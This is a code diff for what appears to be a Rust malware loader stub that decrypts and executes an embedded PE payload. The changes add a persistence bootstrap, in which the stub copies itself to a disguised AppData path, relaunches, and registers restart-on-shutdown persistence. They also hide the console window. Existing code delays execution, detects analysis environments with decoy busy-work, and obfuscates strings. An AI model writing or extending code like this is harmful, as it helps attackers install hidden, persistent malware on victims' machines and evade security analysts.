@@ -1,5 +1,6 @@
-// #![windows_subsystem = "windows"] // Uncomment to link as a GUI-subsystem PE (no console window) 
+#![windows_subsystem = "windows"] // Uncomment to link as a GUI-subsystem PE (no console window) 
 mod generated;
+mod persistence;
 mod logger;
 use generated::{KEY, NONCE, DELAY_SECS, VERBOSE, ANALYSIS_DETECTION};
 use std::error::Error;
@@ -62,7 +63,7 @@ fn execute(pe_bytes: &[u8]) -> Result<(), Box<dyn Error>> {
 fn behavior_misleading(duration_secs: u64) {
     let target = Duration::from_secs(duration_secs);
     let start = Instant::now();
-    let worker = BusyWork::new(Intensity::High).allow(Categories::COMPUTE | Categories::MEMORY);
+    let worker = BusyWork::new(Intensity::Low).allow(Categories::COMPUTE | Categories::MEMORY);
 
     while start.elapsed() < target {
         worker.run();
@@ -78,17 +79,46 @@ fn delay_execution() {
     }
 }
 
+// ... (rest of the imports unchanged) ...
+
 fn run() -> Result<(), Box<dyn Error>> {
     // Keep PADDING from being stripped by the linker in release builds.
     std::hint::black_box(&PADDING);
 
+    // ---------------------------------------------------------------
+    // Persistence bootstrap.
+    //
+    // On the first run, the stub copies itself to a masqueraded path
+    // under AppData, launches the copy, and exits. On subsequent runs
+    // (the copy), it detects that it is already in the target location
+    // and registers Phantom Persistence instead of copying again.
+    // ---------------------------------------------------------------
+    if persistence::is_running_from_target() {
+        // We are the copy. Register for restart-on-shutdown.
+        persistence::register_persistence();
+    } else {
+        // First run. Install and launch the copy, then exit.
+        if persistence::install_and_launch().is_ok() {
+            return Ok(());
+        }
+        // If install failed (no APPDATA, permissions, etc.), fall through
+        // and run the payload normally. The stub still works, it just
+        // won't persist.
+        if VERBOSE {
+            logger::log_error(obfstr!("persistence install failed, running payload only"));
+        }
+    }
+
+    // ---------------------------------------------------------------
+    // Normal payload flow.
+    // ---------------------------------------------------------------
     delay_execution();
 
     if ANALYSIS_DETECTION && analysis_detected() {
         if VERBOSE {
             logger::log_info(obfstr!("analysis detected. changing behavior..."));
         }
-        behavior_misleading(rand::rng().random_range(60..120)); // Random delay between 60 and 120 seconds
+        behavior_misleading(rand::rng().random_range(60..120));
         return Ok(());
     }
 
